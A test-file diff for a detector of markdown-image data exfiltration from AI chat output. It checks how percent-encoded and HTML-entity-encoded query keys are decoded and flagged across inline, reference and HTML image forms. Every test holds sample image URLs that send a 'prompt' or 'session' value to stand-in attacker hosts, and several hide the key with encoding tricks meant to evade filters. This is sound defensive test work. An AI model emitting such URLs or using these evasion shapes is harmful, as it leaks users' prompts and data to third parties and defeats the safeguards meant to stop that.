@@ -626,3 +626,465 @@ describe("HTML img entity-decoded src (v1.13.0)", () => {
     expect(out[0].meta.entityDecoded).toBeUndefined();
   });
 });
+
+// ---- v1.15.0 Theme B: percent-decoded URL pre-pass --------------------------
+//
+// Browsers and the WHATWG URL parser treat percent-encoded reserved chars in
+// path/query as literal bytes — but our STRONG_KEYS / WEAK_KEYS lookup matches
+// keys verbatim, so an attacker who writes `?%70rompt=…` (encoded 'p') hides
+// the strong key from the raw classifier even though the URL fetches just fine.
+// classifyUrl() now runs a minimal percent-decode pre-pass (allowlist of 6
+// reserved chars) when the raw form misses, and the verdict is marked with
+// meta.percentDecoded=true. The pass applies to ALL 3 image shapes uniformly.
+//
+// Composable with v1.13.0 entity-decode on the html-img path (both flags can
+// be true for the &quot;…%70rompt… double-obfuscation shape).
+//
+// Allowlist: %2F / %3F / %26 / %3D / %23 / %20 (case-insensitive hex). %25
+// (`%`) is EXCLUDED to prevent double-decode bypass.
+describe("md-exfil percent-decoded URL — v1.15.0 Theme B", () => {
+  it("(a) inline image with %70rompt -> danger via URLSearchParams native percent-decode", () => {
+    // WHATWG URLSearchParams natively percent-decodes ALL bytes in the key
+    // name during parsing, so `?%70rompt=…` is seen as key "prompt" without
+    // any pre-pass help. This case takes the FAST PATH (raw classify hits)
+    // and meta.percentDecoded is therefore UNDEFINED — our 2-pass pre-shell
+    // never runs because the raw verdict is non-null.
+    //
+    // The pre-pass is needed for RESERVED chars (the 6 in the allowlist)
+    // because URLSearchParams uses literal `&` / `=` to tokenize BEFORE
+    // percent-decoding values. Hiding the separator with `%26` is what
+    // bypasses raw classification — covered in (b) / (c) below.
+    const md = `![x](http://attacker.example/p?%70rompt=PAYLOAD)`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].meta).toMatchObject({ matchedKey: "prompt" });
+    // Fast-path hit: percentDecoded flag NOT set on raw-classification hits.
+    expect(out[0].meta.percentDecoded).toBeUndefined();
+  });
+
+  it("(b) inline image with ?a=A%26prompt=B (encoded & splits query, exposing prompt) -> danger", () => {
+    // Raw URL: searchParams sees a single key "a" with value "A&prompt=B"
+    // (since `%26` is part of the value). Off-list -> raw miss.
+    // Percent-decode: `%26` -> `&` -> URL becomes `?a=A&prompt=B`, so
+    // searchParams now sees `a` + `prompt`. 1 strong -> danger.
+    const md = `![x](http://attacker.example/p?a=A%26prompt=B)`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].technique).toBe("Markdown image exfiltration (strong key)");
+    expect(out[0].element).toBe("md-image");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+    // R13 bracket contract: slice round-trips to the RAW (still encoded) URL.
+    const url = `http://attacker.example/p?a=A%26prompt=B`;
+    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
+  });
+
+  it("(c) html-img with ?a=A%26session=B (encoded & exposes weak key) -> warning", () => {
+    // Same shape as (b) but the post-decode key is weak (session) — verdict
+    // demotes to warning. Pins that the host-tier matrix (unknown-host
+    // weak>=1 = warning) flows through the percent-decode path.
+    const md = `<img src="http://attacker.example/p?a=A%26session=B">`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("warning");
+    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
+    expect(out[0].element).toBe("html-img");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "session",
+      percentDecoded: true,
+    });
+  });
+
+  it("(d) reference-image with %26-encoded strong key on def-line -> danger", () => {
+    // The ref-image path also flows through classifyUrl() — pin parity with
+    // the inline path. Definition-line URL anchors position+matchLen.
+    const url = `http://attacker.example/sink?safe=A%26prompt=PAYLOAD`;
+    const md = `![ref][r]\n\n[r]: ${url}`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("md-image-ref");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
+  });
+
+  it("(e) raw URL with un-encoded strong key -> fast-path hit, percentDecoded UNDEFINED", () => {
+    // Sanity: a normal `?prompt=PAYLOAD` URL takes the raw fast path. The
+    // 2-pass shell only marks meta.percentDecoded when the DECODED path
+    // produced the verdict. Mirror the existing entity-decoded sanity pin.
+    const md = `![x](http://attacker.example/p?prompt=PAYLOAD)`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].meta.percentDecoded).toBeUndefined();
+  });
+
+  it("(f) URL with %25 (encoded percent) -> NOT double-decoded, stays silent", () => {
+    // %25 is intentionally EXCLUDED from the allowlist to prevent
+    // double-decode bypass (`%2525prompt` -> `%25prompt` -> `%prompt`).
+    // The raw URL has `%2525prompt` as the key name (off-list), and our
+    // decoder leaves `%25` untouched, so the decoded form also has
+    // `%2525prompt` as the key. No finding either way.
+    const md = `![x](http://attacker.example/p?%2525prompt=X)`;
+    expect(detectMarkdownExfil(md)).toEqual([]);
+  });
+
+  it("(g) safe-host (i.imgur.com) + %26-encoded strong key -> SAFE (short-circuit on decoded host)", () => {
+    // Critical safety net: classifyUrlImpl runs isSafeHost() BEFORE
+    // classifyQueryKeys(), and the hostname is identical raw vs decoded
+    // (host is not percent-encoded). The decoded form still short-circuits
+    // on i.imgur.com before any key counting.
+    const md = `![x](https://i.imgur.com/abc.png?a=A%26prompt=PAYLOAD)`;
+    expect(detectMarkdownExfil(md)).toEqual([]);
+  });
+
+  it("(h) html-img: combined entity + percent encoding -> meta has BOTH entityDecoded AND percentDecoded", () => {
+    // Double-obfuscation: attacker wraps the URL in &quot;…&quot; AND hides
+    // the prompt key behind %26. The html-img raw classify misses (entity-
+    // encoded protocol), the entity-decoded form is then re-classified via
+    // classifyUrl() which itself runs the percent-decode 2-pass. The final
+    // meta carries both flags.
+    const md = `<img src=&quot;http://attacker.example/p?a=A%26prompt=PAYLOAD&quot;>`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].technique).toBe("Markdown image exfiltration (strong key)");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      entityDecoded: true,
+      percentDecoded: true,
+    });
+  });
+
+  it("(i) R12: technique stays fixed-phrase on percent-decoded path", () => {
+    // priority.js#labelFor reads `technique` into the banner. Even on the
+    // percent-decoded path the technique must be one of the 4 fixed phrases.
+    // The decoded URL string must NEVER appear in technique or content.
+    const md = `![x](http://evil-pct.example/c?a=A%26prompt=PAYLOAD-STR)`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    const f = out[0];
+    const allowed = new Set([
+      "Markdown image exfiltration (strong key)",
+      "Markdown image exfiltration (weak key)",
+      "Markdown image exfiltration (public IP host)",
+      "Markdown image exfiltration (private IP host)",
+    ]);
+    expect(allowed.has(f.technique)).toBe(true);
+    expect(f.technique).not.toContain("evil-pct.example");
+    expect(f.technique).not.toContain("PAYLOAD-STR");
+    expect(f.technique).not.toContain("prompt");
+    expect(f.technique).not.toContain("%26");
+    expect(f.meta.host).toBe("evil-pct.example");
+    expect(f.meta.percentDecoded).toBe(true);
+    // R13: content echoes the RAW (encoded) URL, NOT the decoded form.
+    expect(f.content).toContain("%26");
+    expect(f.content).not.toContain("a=A&prompt");
+  });
+
+  it("(j) public IP literal + %26-encoded strong key -> danger (public IP host)", () => {
+    // Pin the public-IP tier survives the percent-decode 2-pass.
+    const md = `![x](http://203.0.113.42/c?a=A%26prompt=PAYLOAD)`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].technique).toBe("Markdown image exfiltration (public IP host)");
+    expect(out[0].meta).toMatchObject({
+      ipKind: "public",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+  });
+
+  it("(k) private IP + %26-encoded weak key -> SILENT (matrix mirrored on decoded path)", () => {
+    // Private/loopback + weak-only stays silent per v1.9.0 host-tier matrix.
+    // The percent-decode 2-pass MUST NOT bypass this rule.
+    const md = `![x](http://192.168.1.10/c?a=A%26session=B)`;
+    expect(detectMarkdownExfil(md)).toEqual([]);
+  });
+
+  it("(l) benign URL without `%` -> fast-path skip (no surface change)", () => {
+    // Zero-cost-skip sanity: a URL with no `%` chars must take the
+    // `!rawUrl.includes('%')` early return after raw miss. No findings.
+    const md = `![x](http://benign.example/p?safe_key=A&other_key=B)`;
+    expect(detectMarkdownExfil(md)).toEqual([]);
+  });
+});
+
+// ---- v1.16.0 Theme T-C: entity + percent matrix ---------------------------
+//
+// This block pins the full (encoding × image-shape) interaction surface that
+// emerged after stacking v1.13.0 entity-decode (html-img path only) and
+// v1.15.0 percent-decode (all 3 paths, classifyUrl entry).
+//
+// Axes:
+//   encoding  ∈ { raw, entity-only, percent-only, both }
+//   shape     ∈ { inline `![alt](url)`, ref `![a][r]…[r]: url`, html-img }
+//
+// → 4 × 3 = 12 cells.
+//
+// Two scope rules drive the expected verdicts and explain the asymmetries:
+//
+//   1. The percent-decode 2-pass lives INSIDE classifyUrl(), so ALL 3 shapes
+//      benefit from it uniformly. A `%26`-encoded `&` separator that hides
+//      `prompt` is therefore detected on inline, ref, AND html-img — each
+//      with meta.percentDecoded === true.
+//
+//   2. The entity-decode 2-pass lives in detectMarkdownExfil()'s Pass 4
+//      (html-img loop) ONLY. CommonMark does not entity-decode inside `()`,
+//      so an `&amp;`-encoded `&` separator that hides `prompt` is detected
+//      ONLY in the html-img shape (entityDecoded=true). On inline / ref
+//      shapes the raw URL has `prompt` hidden behind `&amp;`, the percent-
+//      decode 2-pass is a no-op (no `%`), and the cell stays silent — this is
+//      intentional and pinned by the inline-entity-only / ref-entity-only
+//      cells below.
+//
+// The "both" column (entity + percent in the same URL) stacks differently per
+// shape:
+//   - html-img: entity-decode runs first (Pass 4), then classifyUrl() runs
+//     its percent-decode 2-pass on the entity-decoded form. Both flags set.
+//   - inline / ref: only classifyUrl() runs, so only percent-decode fires.
+//     Result: percentDecoded=true, entityDecoded undefined. The `&amp;`
+//     fragments survive as literal text but the `%26`→`&` decode is what
+//     exposes `prompt` to the URLSearchParams tokenizer, so the finding is
+//     still surfaced — just without the entityDecoded flag.
+//
+// Each `it` asserts:
+//   - finding count (1 for hit, 0 for silent)
+//   - severity (always "danger" here — every hit cell carries `prompt`)
+//   - element tag matches the shape
+//   - meta.host / meta.matchedKey when present
+//   - meta.entityDecoded / meta.percentDecoded flag combination matches the
+//     2-pass route the cell is expected to take
+//
+// Notes:
+//   - Test-only addition; no source files touched. Core logic unchanged.
+//   - All URLs use the unknown attacker host `attacker.example` so the
+//     host-tier matrix (R20) doesn't interfere — strong key alone yields
+//     danger uniformly. Safe-host / IP-literal interactions are pinned in
+//     earlier blocks.
+//   - "raw" cells exist to lock the no-flag baseline: a normal `?prompt=...`
+//     URL must NOT have entityDecoded or percentDecoded set on the verdict.
+describe("md-exfil entity+percent matrix (v1.16.0 Theme T-C)", () => {
+  // ---- raw (no encoding) — fast-path raw classifyUrl hit, no flags --------
+
+  it("raw × inline -> danger, no decode flags", () => {
+    const md = `![x](http://attacker.example/p?prompt=PAYLOAD)`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("md-image");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+    });
+    expect(out[0].meta.entityDecoded).toBeUndefined();
+    expect(out[0].meta.percentDecoded).toBeUndefined();
+  });
+
+  it("raw × ref -> danger, no decode flags", () => {
+    const url = `http://attacker.example/p?prompt=PAYLOAD`;
+    const md = `![x][r]\n\n[r]: ${url}`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("md-image-ref");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+    });
+    expect(out[0].meta.entityDecoded).toBeUndefined();
+    expect(out[0].meta.percentDecoded).toBeUndefined();
+  });
+
+  it("raw × html-img -> danger, no decode flags", () => {
+    const md = `<img src="http://attacker.example/p?prompt=PAYLOAD">`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("html-img");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+    });
+    expect(out[0].meta.entityDecoded).toBeUndefined();
+    expect(out[0].meta.percentDecoded).toBeUndefined();
+  });
+
+  // ---- entity-only (&amp; hides &) — html-img ONLY decodes ----------------
+
+  it("entity-only × inline -> SILENT (CommonMark doesn't entity-decode in parens)", () => {
+    // Raw URL: `?a=A&amp;prompt=B`. URLSearchParams splits on literal `&`, so
+    // keys are `a` (off-list) and `amp;prompt` (off-list). 0 strong / 0 weak.
+    // No `%` -> percent-decode 2-pass skips. Inline path has NO entity decode,
+    // so the cell stays silent. Pins the scope boundary.
+    const md = `![x](http://attacker.example/p?a=A&amp;prompt=B)`;
+    expect(detectMarkdownExfil(md)).toEqual([]);
+  });
+
+  it("entity-only × ref -> SILENT (ref path has no entity decode either)", () => {
+    // Same logic as inline-entity-only: ref-image path resolves via refDefs
+    // and feeds raw URL straight into classifyUrl() — no entity decode.
+    const url = `http://attacker.example/p?a=A&amp;prompt=B`;
+    const md = `![x][r]\n\n[r]: ${url}`;
+    expect(detectMarkdownExfil(md)).toEqual([]);
+  });
+
+  it("entity-only × html-img -> danger via entity-decode 2-pass", () => {
+    // Pass 4 (html-img) runs decodeBasicHtmlEntities on the raw src token
+    // when raw classifyUrl misses. `&amp;` -> `&` exposes `prompt` to the
+    // URLSearchParams tokenizer. entityDecoded=true marks the path;
+    // percentDecoded is NOT set because the decoded URL has no `%` left.
+    const md = `<img src="http://attacker.example/p?a=A&amp;prompt=B">`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("html-img");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      entityDecoded: true,
+    });
+    expect(out[0].meta.percentDecoded).toBeUndefined();
+  });
+
+  // ---- percent-only (%26 hides &) — classifyUrl 2-pass on ALL 3 shapes ----
+
+  it("percent-only × inline -> danger via percent-decode 2-pass", () => {
+    // Raw: `?a=A%26prompt=B`. searchParams sees one key `a` with value
+    // `A&prompt=B` (since `%26` is value-side bytes). 0 strong / 0 weak ->
+    // raw miss. Decode `%26`->`&` -> `?a=A&prompt=B` -> 1 strong -> danger.
+    const md = `![x](http://attacker.example/p?a=A%26prompt=B)`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("md-image");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+    expect(out[0].meta.entityDecoded).toBeUndefined();
+  });
+
+  it("percent-only × ref -> danger via percent-decode 2-pass", () => {
+    // Mirrors the inline cell — ref-image also routes through classifyUrl()
+    // so the percent-decode 2-pass applies. Pins ref-path parity.
+    const url = `http://attacker.example/p?a=A%26prompt=B`;
+    const md = `![x][r]\n\n[r]: ${url}`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("md-image-ref");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+    expect(out[0].meta.entityDecoded).toBeUndefined();
+  });
+
+  it("percent-only × html-img -> danger via percent-decode 2-pass (raw path)", () => {
+    // html-img Pass 4 tries raw classifyUrl FIRST. Raw classifyUrl itself
+    // runs the percent-decode 2-pass internally, so this hits on the raw
+    // src token's classifyUrl call WITHOUT entering the entity-decode path.
+    // entityDecoded MUST be undefined; percentDecoded must be true.
+    const md = `<img src="http://attacker.example/p?a=A%26prompt=B">`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("html-img");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+    expect(out[0].meta.entityDecoded).toBeUndefined();
+  });
+
+  // ---- both (&amp; AND %26 in the same URL) — stacks differently per shape
+
+  it("both × inline -> danger via percent only (entityDecoded NOT set)", () => {
+    // Raw: `?a=A&amp;b=B%26prompt=C`. URLSearchParams literal-`&`-splits the
+    // raw form into `a=A`, `amp;b=B%26prompt=C` (both off-list). 0 strong
+    // -> raw miss. Decode `%26`->`&` -> `?a=A&amp;b=B&prompt=C` -> keys are
+    // `a`, `amp;b`, `prompt`. 1 strong -> danger. Inline path never runs
+    // entity-decode, so the `&amp;` fragment survives as a literal off-list
+    // key — but `prompt` is exposed by the `%26` decode alone. Pins that
+    // percent-decode works even when other encodings are present in the URL.
+    const md = `![x](http://attacker.example/p?a=A&amp;b=B%26prompt=C)`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("md-image");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+    // Entity-decode is html-img scope only — inline NEVER sets this flag.
+    expect(out[0].meta.entityDecoded).toBeUndefined();
+  });
+
+  it("both × ref -> danger via percent only (entityDecoded NOT set)", () => {
+    // Same shape as inline "both" but routed through the reference-image
+    // path. Same expected behaviour: percent-decode exposes `prompt`,
+    // entity-decode is out of scope. Pins ref-path parity for "both".
+    const url = `http://attacker.example/p?a=A&amp;b=B%26prompt=C`;
+    const md = `![x][r]\n\n[r]: ${url}`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("md-image-ref");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      percentDecoded: true,
+    });
+    expect(out[0].meta.entityDecoded).toBeUndefined();
+  });
+
+  it("both × html-img -> danger with BOTH entityDecoded AND percentDecoded", () => {
+    // To force BOTH flags we need a URL where classifyUrl(rawUrl) returns
+    // NULL even after its own internal percent-decode 2-pass, so Pass 4
+    // falls through to entity-decode and re-classifies the decoded form.
+    //
+    // URL: `?safekey=A&amp;prompt%3DC` — chosen so percent-decode alone
+    // can't reveal `prompt`:
+    //   - Raw classifyUrlImpl: keys `safekey`, `amp;prompt%3dc` -> miss.
+    //   - Percent-decode raw: `%3D`->`=` -> `?safekey=A&amp;prompt=C`,
+    //     keys `safekey`, `amp;prompt` -> still miss. classifyUrl(raw) = null.
+    //   - Pass 4 falls through to entity-decode: `&amp;`->`&` ->
+    //     `?safekey=A&prompt%3DC`.
+    //   - classifyUrl(entity-decoded): inner percent-decode 2-pass fires
+    //     -> `?safekey=A&prompt=C` -> keys `safekey`, `prompt` -> HIT.
+    //   - Pass 4 then merges `entityDecoded: true` on top of the
+    //     `percentDecoded: true` already in decodedVerdict.meta.
+    //
+    // This is the canonical shape that exercises the FULL 4-stage route
+    // (raw -> percent / entity -> entity+percent) and pins both flags
+    // surviving the meta merge.
+    const md = `<img src="http://attacker.example/p?safekey=A&amp;prompt%3DC">`;
+    const out = detectMarkdownExfil(md);
+    expect(out).toHaveLength(1);
+    expect(out[0].severity).toBe("danger");
+    expect(out[0].element).toBe("html-img");
+    expect(out[0].meta).toMatchObject({
+      host: "attacker.example",
+      matchedKey: "prompt",
+      entityDecoded: true,
+      percentDecoded: true,
+    });
+  });
+});
